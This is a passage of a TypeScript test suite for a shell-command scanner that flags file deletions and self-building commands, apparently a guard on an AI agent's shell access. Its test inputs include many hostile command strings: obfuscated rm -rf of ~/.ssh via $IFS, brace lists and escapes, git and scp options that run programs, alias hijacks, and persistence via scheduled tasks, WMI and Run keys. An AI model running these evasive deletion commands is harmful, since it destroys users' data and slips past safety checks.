      expect(scan(cmd).unresolvedMutation?.op, cmd).toBe(op)
    })
  }
  const SELF: string[] = [
    'Set-Alias Get-Content Remove-Item; Get-Content D:\\DCIM -Recurse',
    'New-Item -Path alias:cat -Value Remove-Item -Force; cat D:\\DCIM -Recurse',
    'Set-Item alias:cat Remove-Item -Force; cat D:\\DCIM -Recurse',
    'Import-Alias x.csv; gci ~ -Force | d2 -Recurse',
    'function Sort-Object { process { $_.Parent } }; Get-Item . | Sort-Object | Remove-Item -Recurse -Force',
    "[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT','1'); git clean -fdx",
    '$env:GIT_EXEC_PATH = "$PWD"; git status',
    'git clone --config core.fsmonitor=x.cmd https://example.invalid/r r',
    "Start-Process cmd @('/c', $x)",
    "python -c (Get-Content .\\p.txt -Raw)",
    'bash -c "$(cat c.sh)"',
    "Register-ScheduledTask -TaskName x -Action (New-ScheduledTaskAction -Execute cmd -Argument '/c rd /s /q D:\\DCIM')",
    "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /c rd /s /q D:\\DCIM'",
    "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run x 'cmd /c rd /s /q D:\\DCIM'",
    'schtasks /run /tn x',
  ]
  for (const cmd of SELF) {
    it(`self-building: ${JSON.stringify(cmd).slice(0, 90)}`, () => {
      expect(scan(cmd).selfBuilding, cmd).not.toBeNull()
    })
  }
  it('the facts the policy judges: a temp name reassigned, a folder that cannot be read, an unread operand', () => {
    const t = scan("$env:TEMP = 'D:\\DCIM'; Remove-Item -Recurse -Force ([IO.Path]::GetTempPath())")
    expect(t.tempRedirected).toMatch(/TEMP/)
    expect(ofOp(t, 'delete').some(p => p.anchor === 'temp')).toBe(true)
    expect(scan('Remove-Item -Recurse -Force ([IO.Path]::GetTempPath())').tempRedirected).toBeNull()
    const stale = scan('Set-Location "$((Get-Volume -FileSystemLabel LUMIX).DriveLetter):/"; Remove-Item "$PWD/DCIM" -Recurse -Force')
    expect(ofOp(stale, 'delete').some(p => p.staleBase)).toBe(true)
    expect(scan('Set-Location (Get-PSDrive D).Root; python clean.py').unreadFolder?.verb).toBe('python')
    // sdelete's operands are deletes since the sixth review: one it cannot read is an unread delete.
    expect(scan("$t = [char]68 + ':\\DCIM'; sdelete -s -q $t").unresolvedMutation?.op).toBe('delete')
    // keywords, expressions and read-only cmdlets are not programs
    for (const c of ['if (-not $?) { exit 1 }', '[Math]::Min($a, $b)', '$x | Select-Object -First $n', '(Get-Date) - $start']) {
      expect(scan(c).unreadOperand, c).toBeNull()
    }
  })
  it('the folder a program, a script, an interpreter or git is started in is one of its operands', () => {
    const started = (c: string, base = BASE) => scanShellText(c, base, W, { platform: 'win32' }).paths.filter(p => p.startedIn).map(p => p.path)
    expect(started('cd D:\\; python C:\\Users\\u\\proj\\clean.py')).toEqual(['D:\\'])
    expect(started('cd C:\\Users\\u; git status')).toEqual(['C:\\Users\\u'])
    expect(started('npm test')).toEqual([BASE])
    expect(started("Start-Process python -ArgumentList 'C:\\Users\\u\\proj\\clean.py' -WorkingDirectory D:\\")).toEqual(['D:\\'])
    expect(started('Get-ChildItem | Select-Object Name')).toEqual([])
  })
  it('honest shapes stay readable: no unread target and no self-building marker', () => {
    for (const c of [
      'cmd /c "echo it\'s done"', "git log --author='bot@example' -5", "Write-Output 'mail me @'",
      "$dirs = 'build',\n  'dist'\nRemove-Item $dirs -Recurse -Force", "Remove-Item ('{0}\\{1}' -f 'build', 'cache') -Recurse -Force",
      '$t = Get-Item x; Remove-Item $t', 'Get-ChildItem tests -Filter *.py | ForEach-Object { python -m pytest $_.FullName -q }',
      "Get-ChildItem -Recurse -Filter *.py | ForEach-Object { (Get-Content $_.FullName) -replace 'a','b' | Set-Content $_.FullName }",
      "Set-Content src\\save.py @'\nfrom pathlib import Path\np = Path.home() / '.civkings'\n'@",
    ]) {
      const s = scan(c)
      expect(s.unresolvedMutation, c).toBeNull()
      expect(s.selfBuilding, c).toBeNull()
    }
  })
})

describe('the seventh review of 2026-11-24: what the scan reads', () => {
  it('PowerShell binds a one-letter name, an alias, a prefix of an alias and a colon then a space', () => {
    expect(pathsOf(scan('Get-ChildItem -L:C:\\Users\\u -Force | Remove-Item -Recurse -Force'), 'delete')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(scan('Set-Location -PSP C:\\x; Remove-Item .cache -Recurse'), 'delete')).toEqual(['C:\\x\\.cache'])
    expect(pathsOf(scan('Copy-Item -Destination: C:\\x\\y .\\a.txt'), 'write')).toEqual(['C:\\x\\y'])
    expect(ofOp(scan('New-Item -Ty Junction -Path .\\l -Target C:\\x'), 'link').map(p => p.linkTarget)).toEqual(['C:\\x'])
    expect(pathsOf(scan('Push-Location -StackName s C:\\x; Remove-Item a'), 'delete')).toEqual(['C:\\x\\a'])
  })
  it('a braced PowerShell name is the whole text up to its brace, never a POSIX expansion', () => {
    expect(pathsOf(scan("${x-y} = 'C:\\a'; Remove-Item ${x-y}"), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan("${C:\\a\\b.txt} = 'x'"), 'write')).toEqual(['C:\\a\\b.txt'])
    expect(scan("$t = 'a'; $variable:t = 'C:\\x'; Remove-Item $t").paths.some(p => p.op === 'delete' && p.path === 'C:\\x')).toBe(true)
    expect(scan("$t = 'a'; (Get-Variable t).Value = 'C:\\x'; Remove-Item $t").unresolvedMutation?.op).toBe('delete')
  })
  it('an item source of a comma list is one item per path, and a method on a list runs on every element', () => {
    expect(pathsOf(scan('$d = Get-Item .\\a,C:\\x; Remove-Item $d'), 'delete')).toEqual(['C:\\Users\\u\\proj\\a', 'C:\\x'])
    expect(pathsOf(scan("$t = '.\\a','C:\\x'; Remove-Item $t.Trim()"), 'delete')).toEqual(['C:\\Users\\u\\proj\\a', 'C:\\x'])
  })
  it('a temp name assigned a value in the run is bound; one assigned elsewhere or unread is reported', () => {
    expect(scan('$env:TEMP = "$env:CYNCO_SCRATCH\\t"; python x.py').tempRedirected).toBeNull()
    expect(scan('TMPDIR=$(mktemp -d); python x.py').tempRedirected).toBeNull()
    expect(scan("$env:TEMP = 'C:\\x'; python x.py").tempRedirected).toMatch(/TEMP/)
    expect(scan('$env:TEMP += "x"; python x.py').tempRedirected).toMatch(/TEMP/)
    // `$tmp` and POSIX `tmp` are variables, and an env: item that names no temp variable touches none.
    expect(scan("$tmp = 'C:\\x'; python x.py").tempRedirected).toBeNull()
    expect(scan('Remove-Item Env:NODE_ENV; python x.py').tempRedirected).toBeNull()
    expect(scan("Set-Item Env:TMP 'C:\\x'; python x.py").tempRedirected).not.toBeNull()
  })
  it('New-Item hands its variable the item it makes', () => {
    expect(pathsOf(scan('$d = New-Item -ItemType Directory -Force .\\out\\w; Remove-Item $d -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\proj\\out\\w'])
    expect(ofOp(scan('$d = New-Item -ItemType Directory -Path (Join-Path $env:TEMP (Get-Random)); Remove-Item $d'), 'delete').map(p => p.children)).toEqual([true])
  })
  it('find runs a delete body that names more than the item on each root, never skipping it', () => {
    expect(pathsOf(scan("find . -name x -exec rm -rf ~/.cache/{} \\;"), 'delete').some(p => p.startsWith('C:\\Users\\u\\.cache'))).toBe(true)
    expect(pathsOf(scan("find . -name '*.pyc' -exec rm -f {} +"), 'delete')).toEqual(['C:\\Users\\u\\proj'])
  })
  it('an interpreter option that takes a value does not hide the program after it', () => {
    expect(pathsOf(scan("python -X utf8 -c \"import shutil; shutil.rmtree('C:/x')\""), 'delete')).toEqual(['C:\\x'])
    expect(pathsOf(scan("perl -I lib -e \"use File::Path; rmtree('C:/x')\""), 'delete')).toEqual(['C:\\x'])
  })
})

// ─── Wave 15 (2026-11-24): the backlog's reader gaps (docs/NOW.md) ─────────────────────────────

describe('wave 15: the readings the backlog named', () => {
  // Windows PowerShell 5.1 hands `bash -c '... \"x\" ...'` to bash.exe with plain double quotes (wave 8 RR8-3):
  // the payload is read as 5.1 hands it on, and as written (what PowerShell 7's standard passing hands on).
  it('a bash -c payload in PowerShell single quotes with \\" is read as Windows PowerShell 5.1 hands it to bash', () => {
    expect(pathsOf(scan("bash -c 'rm -rf \\\"$LOCALAPPDATA\\\"/*'"), 'delete')).toContain('C:\\Users\\u\\AppData\\Local')
    expect(pathsOf(scan("bash -c 'rm -rf \\\"$HOME\\\"/.cynco'"), 'delete')).toContain('C:\\Users\\u\\.cynco')
    expect(pathsOf(scan("& 'C:\\Program Files\\Git\\bin\\bash.exe' -c 'rm -rf \\\"C:/Users/u/proj/../.cache\\\"'"), 'delete')).toContain('C:\\Users\\u\\.cache')
    // In the mission folder it stays in the mission folder in both readings.
    const inside = pathsOf(scan("bash -c 'rm -rf \\\"./x\\\"'"), 'delete')
    expect(inside).toContain('C:\\Users\\u\\proj\\x')
    expect(inside.every(p => p.toLowerCase().startsWith('c:\\users\\u\\proj\\'))).toBe(true)
  })
  it('an unquoted \\" in a POSIX shell is a literal quote: what PowerShell 7 hands on is read too', () => {
    expect(pathsOf(scan("bash -c 'echo \\\"; rm -rf ~/.ssh; echo \\\"'"), 'delete')).toContain('C:\\Users\\u\\.ssh')
  })
  it('a lone HOMEDRIVE is the home\'s drive', () => {
    expect(pathsOf(scan('Remove-Item -Recurse $env:HOMEDRIVE\\Users\\u\\.cache'), 'delete')).toEqual(['C:\\Users\\u\\.cache'])
    expect(pathsOf(scan('cmd /c rd /s /q %HOMEDRIVE%\\Users\\u\\proj\\build'), 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    expect(pathsOf(scan('Remove-Item -Recurse "${env:HOMEDRIVE}\\Users"'), 'delete')).toEqual(['C:\\Users'])
    // The pair is the home, as before.
    expect(pathsOf(scan('Remove-Item -Recurse $env:HOMEDRIVE$env:HOMEPATH\\.x'), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('a Cygwin drive (/cygdrive/c) is that drive, as /mnt/c and /c are', () => {
    expect(pathsOf(scan('rm -rf /cygdrive/c/Users/u/.cache'), 'delete')).toEqual(['C:\\Users\\u\\.cache'])
    expect(pathsOf(scan("bash -c 'rm -rf /cygdrive/d/DCIM'"), 'delete')).toEqual(['D:\\DCIM'])
  })
  it('the local administrative share is the local drive (\\\\localhost\\C$, \\\\127.0.0.1\\C$, \\\\?\\UNC\\localhost\\C$)', () => {
    for (const sp of ['\\\\localhost\\C$', '\\\\LOCALHOST\\c$', '\\\\127.0.0.1\\C$', '\\\\?\\UNC\\localhost\\C$', '//localhost/C$']) {
      expect(lower(pathsOf(scan(`Remove-Item -Recurse ${sp}\\Users\\u\\.cache`), 'delete')), sp).toEqual(['c:\\users\\u\\.cache'])
    }
    // Another host's share stays a share.
    expect(pathsOf(scan('Remove-Item -Recurse \\\\nas\\C$\\x'), 'delete')).toEqual(['\\\\nas\\C$\\x'])
  })
  it('scp and ditto write their last operand; a remote operand is not a path here', () => {
    expect(pathsOf(scan('scp build/x.txt C:/other/x'), 'write')).toEqual(['C:\\other\\x'])
    expect(pathsOf(scan('scp -r -P 22 user@host:/tmp/x ../.cache/x'), 'write')).toEqual(['C:\\Users\\u\\.cache\\x'])
    expect(pathsOf(scan('scp x.txt user@host:/tmp/x'), 'write')).toEqual([])
    expect(pathsOf(scan('ditto build C:\\other\\x'), 'write')).toEqual(['C:\\other\\x'])
    expect(pathsOf(scan('ditto -c -k src out.zip'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.zip'])
    // scp told to run a local program builds a command the scan does not read.
    for (const c of ['scp -o ProxyCommand=evil x.txt y.txt', 'scp -oLocalCommand=evil x.txt host:y', 'scp -S ./prog x.txt host:y']) {
      expect(scan(c).selfBuilding, c).toMatch(/scp told to run a program/)
    }
    expect(scan('scp -P 22 -i key x.txt user@host:/tmp/').selfBuilding).toBeNull()
  })
  it('a porcelain status cut by Substring(3) hands on names in the working folder; any other cut is unread', () => {
    const s = scan('git status --porcelain | % { $_.Substring(3) } | Remove-Item -Recurse -Force')
    expect(s.unresolvedMutation).toBeNull()
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u\\proj'])
    expect(scan('git status --porcelain | % { $_.Substring(2) } | Remove-Item').unresolvedMutation?.op).toBe('delete')
    expect(scan('git status --porcelain | % { "..\\" + $_.Substring(3) } | Remove-Item').unresolvedMutation?.op).toBe('delete')
    expect(scan('Get-Content list.txt | % { $_.Substring(3) } | Remove-Item').unresolvedMutation?.op).toBe('delete')
  })
  it('a shadow copy deleted in a foreach over the WMI listing is a device operation', () => {
    for (const c of ['foreach ($s in Get-WmiObject Win32_ShadowCopy) { $s.Delete() }', 'foreach ($s in gwmi Win32_ShadowCopy) { $s.Delete() }']) {
      expect(scan(c).paths.some(p => p.deviceOp !== undefined), c).toBe(true)
    }
    expect(scan('foreach ($s in Get-WmiObject Win32_ShadowCopy) { $s.ID }').paths.some(p => p.deviceOp !== undefined)).toBe(false)
  })
  it('endsInNativeProgram: the last element of the last statement is a program PowerShell starts', () => {
    for (const c of ['cmd /c exit 3', 'python -m pytest -q', 'Write-Output a; git status', 'cmd /c exit 5 > $null', "& 'C:\\x\\tool.exe' -v", 'python x.py # a comment', 'npx vitest run']) {
      expect(endsInNativeProgram(c), c).toBe(true)
    }
    for (const c of ['Get-Item x', 'cmd /c exit 3 | Out-Null', 'python x.py; Write-Output done', '$x = python x.py', 'foreach ($f in 1..2) { python x }',
      'if ($?) { git status }', 'exit 3', "'a' | Out-File x", 'echo hi', '', '& { python x }']) {
      expect(endsInNativeProgram(c), c).toBe(false)
    }
  })
})

describe('wave 15b: what the check of wave 15 found in the reader', () => {
  // P3-F1: in a POSIX shell `\\` is one backslash, so the quote after it opens a string where bash opens one.
  it('an escaped backslash before a quote, outside quotes, is one backslash: the quote opens a string where bash opens it', () => {
    expect(pathsOf(scan('echo \\\\" x" ; rm -rf ~/.ssh', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("bash -c 'echo \\\\\" x\" ; rm -rf ~/.ssh'"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    // Three backslashes: one backslash and a literal quote, as before.
    expect(pathsOf(scan('echo \\\\\\" ; rm -rf ~/.ssh', X, XBASE), 'delete')).toContain('/home/u/.ssh')
  })
  it('an escaped backslash inside double quotes is one backslash: the quote after it closes the string', () => {
    expect(pathsOf(scan('echo "a\\\\" ; rm -rf ~/.ssh ; echo "b"', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("bash -c 'echo \"a\\\\\" ; rm -rf ~/.ssh ; echo \"b\"'"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    // A doubled backslash in an honest string stays where it was.
    expect(pathsOf(scan('printf "a\\\\b" > out.txt', X, XBASE), 'write')).toEqual(['/work/proj/out.txt'])
  })
  // P3-F2: a `-c` payload followed by `$0` and more is the one word after `-c`; the later words are its arguments.
  it('a bash -c payload followed by its $0 and arguments is read as the one word bash runs', () => {
    expect(pathsOf(scan("bash -c 'rm -rf ~/.ssh' _"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(scan("bash -c 'rm -rf ~/.ssh' _", X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("bash -c 'rm -rf \\\"/d/DCIM\\\"/*' _"), 'delete')).toContain('D:\\DCIM')
    expect(pathsOf(scan("& 'C:\\Program Files\\Git\\bin\\bash.exe' -c 'rm -rf \\\"$LOCALAPPDATA\\\"/*' _"), 'delete')).toContain('C:\\Users\\u\\AppData\\Local')
  })
  it('the payload\'s positional parameters are the words after it', () => {
    expect(pathsOf(scan("bash -c 'rm -rf \"$1\"' _ C:/Users/u/.ssh"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(scan("sh -c 'rm -rf \"$0\"/.ssh' C:/Users/u"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(scan("bash -c 'rm -rf \"$@\"' _ build C:/Users/u/.cache"), 'delete')).toContain('C:\\Users\\u\\.cache')
    expect(pathsOf(scan("bash -c 'rm -rf ${2}' _ build ../.cache"), 'delete')).toContain('C:\\Users\\u\\.cache')
    // In the mission folder it stays there.
    const inside = pathsOf(scan("bash -c 'rm -rf \"$1\"' _ build"), 'delete')
    expect(inside).toContain('C:\\Users\\u\\proj\\build')
    expect(inside.every(p => p.toLowerCase().startsWith('c:\\users\\u\\proj'))).toBe(true)
  })
  // P3-F10: the fields a POSIX shell makes, and what Windows PowerShell 5.1 hands bash for plain inner quotes.
  it('$IFS outside single quotes splits a word, as the shell splits it', () => {
    expect(pathsOf(scan('rm${IFS}-rf${IFS}$HOME/.ssh', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan('rm$IFS-rf$IFS$HOME/.cache', X, XBASE), 'delete')).toContain('/home/u/.cache')
    // In single quotes it is text; with IFS assigned in the command the reading is left as it was.
    expect(pathsOf(scan("echo 'rm${IFS}-rf${IFS}$HOME/.ssh'", X, XBASE), 'delete')).toEqual([])
  })
  it('an unquoted expansion in the program\'s place that holds whitespace is the command line it makes', () => {
    expect(pathsOf(scan('c="rm -rf $HOME/.ssh"; $c', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan('x=" "; rm${x}-rf${x}$HOME/.ssh', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("bash -c 'c=\"rm -rf $HOME/.cache\"; $c'"), 'delete')).toContain('C:\\Users\\u\\.cache')
    // A one-word program name, and a quoted expansion, are read as before.
    expect(pathsOf(scan('p=rm; $p -rf build', X, XBASE), 'delete')).toEqual(['/work/proj/build'])
    expect(pathsOf(scan('c="rm -rf $HOME/.ssh"; echo "$c"', X, XBASE), 'delete')).toEqual([])
  })
  it('an unquoted brace list is the words it expands to', () => {
    expect(pathsOf(scan('{rm,-rf,~/.ssh}', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan('rm -rf ~/{.ssh,.cache}', X, XBASE), 'delete')).toEqual(expect.arrayContaining(['/home/u/.ssh', '/home/u/.cache']))
    expect(pathsOf(scan('cp a.txt{,.bak}', X, XBASE), 'write')).toContain('/work/proj/a.txt.bak')
    // Quoted, it is text; `${x,}` is an expansion, not a list.
    expect(pathsOf(scan("echo '{rm,-rf,~/.ssh}'", X, XBASE), 'delete')).toEqual([])
  })
  it('a bash -c payload with plain inner quotes is also read as Windows PowerShell 5.1 hands it to bash', () => {
    expect(pathsOf(scan("bash -c 'echo \"x;rm${IFS}-rf${IFS}$HOME/.ssh\"'"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(scan("bash -c 'echo \"x;{rm,-rf,/d/DCIM}\"'"), 'delete')).toContain('D:\\DCIM')
  })
  it('nativeTailStart: where the last statement of a native-last command starts, only after a ; or a line break', () => {
    expect(nativeTailStart('cmd /c exit 3')).toBe(0)
    expect(nativeTailStart('cmd /c exit 3; no-such-program')).toBe('cmd /c exit 3; '.length)
    expect(nativeTailStart('cmd /c exit 3;  git status')).toBe('cmd /c exit 3;  '.length)
    expect(nativeTailStart('Write-Output a\npython -m pytest -q')).toBe('Write-Output a\n'.length)
    expect(nativeTailStart('Get-Item x | Out-Null; cmd /c exit 4 > $null')).toBe('Get-Item x | Out-Null; '.length)
    // Not native-last, after a call operator, or with a here-string (whose lifting moves the offsets): null.
    for (const c of ['Get-Item x', "& 'C:\\x\\tool.exe' -v", "$t = @'\nx\n'@\ncmd /c exit 3", 'cmd /c exit 3 | Out-Null', '']) {
      expect(nativeTailStart(c), c).toBeNull()
    }
  })
  // P3-F8: git takes a unique prefix of a long option (measured on git 2.53); the Git tool's argv reads the same table.
  it('an abbreviated --upload-pack, --receive-pack or --exec is read as the command git runs, in the argv too', () => {
    const argv = (words: string[]) => scanArgv(words, BASE, W, { platform: 'win32' })
    expect(pathsOf(argv(['git', 'fetch', '--upl=rm -rf ~/.ssh', 'origin']), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(argv(['git', 'push', '--e', 'rm -rf ~/.ssh', 'origin']), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(scan('git ls-remote --upload-p "rm -rf ~/.ssh" x'), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(scan('git clone --conf core.sshCommand=evil x y').selfBuilding).toMatch(/a setting that runs a program/)
    expect(scan('git push --recurse-submodules=check origin main').selfBuilding).toBeNull()
  })
  // P3-F9: scp starts a local program for -S, -D and the ProxyCommand of a config file named by -F.
  it('scp told to run a program in a cluster of flags, through its config file or a Match exec', () => {
    for (const c of ['scp -rS ./prog x host:y', 'scp -F ./cfg x host:y', 'scp -Fcfg x host:y', 'scp -qD ./sftp-server x host:y', 'scp -o "Match exec evil" x host:y', 'scp -ro ProxyCommand=evil x host:y']) {
      expect(scan(c).selfBuilding, c).toMatch(/scp told to run a program/)
    }
    for (const c of ['scp -P 22 -i key x.txt user@host:/tmp/', 'scp -oStrictHostKeyChecking=no x host:y', 'scp -o StrictHostKeyChecking=no x host:y', 'scp -rp build host:y', 'scp -iSkey x host:y']) {
      expect(scan(c).selfBuilding, c).toBeNull()
    }
  })
  it('a POSIX rm with no operand at the head of its pipeline deletes nothing', () => {
    expect(scan('trap rm', X, XBASE).unresolvedMutation).toBeNull()
    expect(scan('rm -rf', X, XBASE).unresolvedMutation).toBeNull()
    expect(scan("bash -c 'trap \"rm -rf x\" EXIT; make'").unresolvedMutation).toBeNull()
    // PowerShell's rm is Remove-Item, which takes its items from the pipeline; a POSIX rm fed by a listing stays read.
    expect(scan('Get-ChildItem x | rm').unresolvedMutation).toBeNull()
    expect(pathsOf(scan('Get-ChildItem x | rm'), 'delete')).toEqual(['C:\\Users\\u\\proj\\x'])
    expect(scan('rm $UNKNOWN_LIST_FROM_FILE', X, XBASE).unresolvedMutation).not.toBeNull()
  })
})

describe('wave 15c: what the check of wave 15b found in the reader', () => {
  const NAMES = (n: number) => Array.from({ length: n }, (_, k) => `a${k}`).join(',')
  // N1: a brace list is never cut short. Up to 256 words it is read whole; past that the call is unreadable.
  it('a brace list that makes more words than the reader expands is a fault, never a list cut short', () => {
    expect(scan(`rm -rf {${NAMES(256)},~/.ssh}`, X, XBASE).faults.join()).toMatch(/a brace list that makes more than 256 words/)
    expect(scan('rm -rf {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,~/.ssh}', X, XBASE).faults.join()).toMatch(/a brace list that makes more than 256 words/)
    // The last of 256 words is read; four lists of four make 256 words, all read.
    expect(pathsOf(scan(`rm -rf {${NAMES(255)},~/.ssh}`, X, XBASE), 'delete')).toContain('/home/u/.ssh')
    const sixteen = scan('touch out/f{0,1,2,3}{0,1,2,3}{0,1,2,3}{0,1,2,3}.txt', X, XBASE)
    expect(sixteen.faults).toEqual([])
    expect(pathsOf(sixteen, 'write')).toContain('/work/proj/out/f3333.txt')
    expect(pathsOf(scan('mkdir -p src/{a,b,c,d,e,f}/test', X, XBASE), 'write')).toContain('/work/proj/src/f/test')
  })
  // N2: the trigger sees a list whose words are quoted, escaped or hold a brace of their own.
  it('a brace list with a quoted or escaped space, or a brace inside one of its words, is the words it expands to', () => {
    expect(pathsOf(scan('rm -rf {"a b",~/.ssh}', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan('rm -rf {a\\ b,~/.ssh}', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan('rm -rf {x{y},~/.ssh}', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("rm -rf {'a b',$HOME/.cache}", X, XBASE), 'delete')).toContain('/home/u/.cache')
    // Quoted braces, and braces with no list, stay text.
    expect(pathsOf(scan("awk '{print $1, $2}' x.txt > out.txt", X, XBASE), 'write')).toEqual(['/work/proj/out.txt'])
    expect(scan('echo "{a, b}" > out.txt', X, XBASE).faults).toEqual([])
  })
  // N3: whitespace before the program name held in a variable splits it the same way.
  it('an expansion in the program\'s place with whitespace only before or only after the name is the command it makes', () => {
    expect(pathsOf(scan('x=" rm"; $x -rf ~/.ssh', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan('x="rm "; $x -rf ~/.ssh', X, XBASE), 'delete')).toContain('/home/u/.ssh')
  })
  // The builder's leftover: an expansion the scan cannot read in the program's place may be a whole command line.
  it('a POSIX program named by an expansion the scan cannot read builds the command it runs', () => {
    expect(scan('c=$(cat cmd.txt); $c', X, XBASE).selfBuilding).toMatch(/a program named by an expansion/)
    expect(scan('c=$(cat cmd.txt); $c ../sib', X, XBASE).selfBuilding).toMatch(/a program named by an expansion/)
    expect(scan("bash -c 'c=$(cat cmd.txt); $c'").selfBuilding).toMatch(/a program named by an expansion/)
    // A quoted expansion is one word; a name bound to a literal is read; PowerShell does not split a variable.
    expect(scan('p=python; $p -m pytest', X, XBASE).selfBuilding).toBeNull()
    expect(scan('c=$(cat cmd.txt); echo "$c"', X, XBASE).selfBuilding).toBeNull()
    expect(scan('$c = Get-Content cmd.txt; & $c').selfBuilding ?? '').not.toMatch(/a program named by an expansion/)
  })
  // The builder's leftover: POSIX `$'...'` quoting decodes its escapes.
  it('a POSIX $\'...\' string is read with its escapes decoded', () => {
    expect(pathsOf(scan("x=$'\\x20'; rm${x}-rf${x}$HOME/.ssh", X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("rm -rf $'\\x2e\\x2e'/.ssh", X, XBASE), 'delete')).toContain('/work/.ssh')
    expect(pathsOf(scan("rm -rf $'\\056\\056'/.ssh", X, XBASE), 'delete')).toContain('/work/.ssh')
    expect(pathsOf(scan("rm -rf $'\\u002e.'/.ssh", X, XBASE), 'delete')).toContain('/work/.ssh')
    // A quote inside it stays inside it; in single or double quotes `$'` is text.
    expect(pathsOf(scan("printf $'it\\'s\\n' > out.txt", X, XBASE), 'write')).toEqual(['/work/proj/out.txt'])
    expect(pathsOf(scan("echo '$''\\x2e\\x2e''/x' > out.txt", X, XBASE), 'delete')).toEqual([])
  })
  // N4: bash's own options before or after -c, and the value of -o, -O, --rcfile and --init-file.
  it('a bash -c payload is the first word after the shell\'s options, wherever -c stands among them', () => {
    for (const c of ["bash -o pipefail -c 'rm -rf ~/.ssh'", "bash -euo pipefail -c 'rm -rf ~/.ssh'", "bash +o pipefail -c 'rm -rf ~/.ssh'",
      "bash -O extglob -c 'rm -rf ~/.ssh'", "bash --rcfile x -c 'rm -rf ~/.ssh'", "bash --init-file x -c 'rm -rf ~/.ssh'",
      "bash -c -e 'rm -rf ~/.ssh'", "bash -c -- 'rm -rf ~/.ssh'", "bash -c - 'rm -rf ~/.ssh'", "bash -cx 'rm -rf ~/.ssh'",
      "bash -xce 'rm -rf ~/.ssh'", "sh -c -e 'rm -rf ~/.ssh' _", "zsh -o extendedglob -c 'rm -rf ~/.ssh'"]) {
      expect(pathsOf(scan(c), 'delete'), c).toContain('C:\\Users\\u\\.ssh')
      expect(pathsOf(scan(c, X, XBASE), 'delete'), c).toContain('/home/u/.ssh')
    }
    // A word after the shell's first other word is not its option: a script and its arguments.
    expect(pathsOf(scan("bash run.sh -c 'rm -rf ~/.ssh'", X, XBASE), 'delete')).toEqual([])
    expect(pathsOf(scan("bash -o pipefail -c 'rm -rf build'", X, XBASE), 'delete')).toEqual(['/work/proj/build'])
  })
  // The builder's leftover: a command word git does not know is an alias (the repository's own, perhaps) and may take
  // the options that run a program; a word that names a property of a plain object is no command either.
  it('an alias in git\'s command place is read with the options that run a program', () => {
    expect(pathsOf(scan('git x --upl="rm -rf ~/.ssh" origin'), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(scan('git sync --rece "rm -rf ~/.cache"'), 'delete')).toContain('C:\\Users\\u\\.cache')
    expect(pathsOf(scanArgv(['git', 'myfetch', '--e=rm -rf ~/.ssh'], BASE, W, { platform: 'win32' }), 'delete')).toContain('C:\\Users\\u\\.ssh')
    // git's own commands keep their own tables: `commit --e` is `--edit`.
    expect(pathsOf(scan('git commit --e="rm -rf ~/.ssh"'), 'delete')).toEqual([])
    expect(scan('git constructor --x').faults).toEqual([])
    expect(scan('git tostring --x').faults).toEqual([])
  })
  // N5 and N6: the reset is not placed where the last statement reads the status the reset would clear.
  it('nativeTailStart: null when the last statement reads $LASTEXITCODE or $?', () => {
    for (const c of ['cmd /c exit 3; cmd /c echo $LASTEXITCODE', 'python a.py; python report.py $global:LASTEXITCODE', 'git status; python x.py $?',
      'python a.py\npython report.py "$LASTEXITCODE"']) {
      expect(nativeTailStart(c), c).toBeNull()
    }
    // Read before the tail, it does not matter.
    expect(nativeTailStart('$c = $LASTEXITCODE; python x.py')).toBe('$c = $LASTEXITCODE; '.length)
    // A here-string moves the offsets, so its text is never given an offset (the asWritten condition): with a body of
    // semicolons an offset taken from the lifted text would land after one.
    expect(nativeTailStart("$t = @'\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n'@; cmd /c exit 3")).toBeNull()
  })
})

describe('wave 19: what the check of wave 15c found in the reader', () => {
  // C2: git takes `--exe` and `--ex` for rebase's `--exec` (measured on git 2.53: "option `exec' requires a value"),
  // and a cluster of short flags ending in x (`-ix`, difftool's `-yx`) for `-x`; difftool does not abbreviate
  // `--extcmd` ("invalid option: --extc").
  it('C2: an abbreviated rebase --exec, and -x inside a cluster or with its value glued on, are the command git runs', () => {
    for (const c of ['git rebase --exe "rm -rf ~/.ssh" HEAD~1', 'git rebase --ex="rm -rf ~/.ssh" HEAD~1', 'git rebase -ix "rm -rf ~/.ssh" HEAD~2',
      'git rebase -x"rm -rf ~/.ssh" HEAD~1', 'git difftool -yx "rm -rf ~/.ssh"',
